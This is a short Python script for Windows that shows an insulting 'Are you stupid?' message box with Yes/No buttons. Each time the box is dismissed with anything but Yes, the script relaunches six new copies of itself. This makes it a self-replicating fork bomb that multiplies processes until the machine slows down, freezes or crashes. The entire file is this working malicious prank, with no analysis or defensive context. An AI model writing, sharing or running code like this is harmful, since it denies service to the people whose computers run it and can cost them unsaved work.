import os
import subprocess
from ctypes import *
from ctypes.wintypes import HWND, LPCSTR, UINT

mboxa = windll.user32.MessageBoxA
mboxa.argtypes = (HWND, LPCSTR, LPCSTR, UINT)
mboxa.restype = UINT

W_HANDLE = None
LP_TEXT = LPCSTR(b"Are you stupid?")
LP_CAPTION = LPCSTR(b"MessageBoxA")
MB_FLAGS = 0x00000004 | 0x00001000

def show_messagebox():
    return mboxa(W_HANDLE, LP_TEXT, LP_CAPTION, MB_FLAGS)

while True:
    if show_messagebox() == 6:
        break

    for _ in range(0, 6):
        subprocess.Popen(["python", os.path.abspath(__file__)])

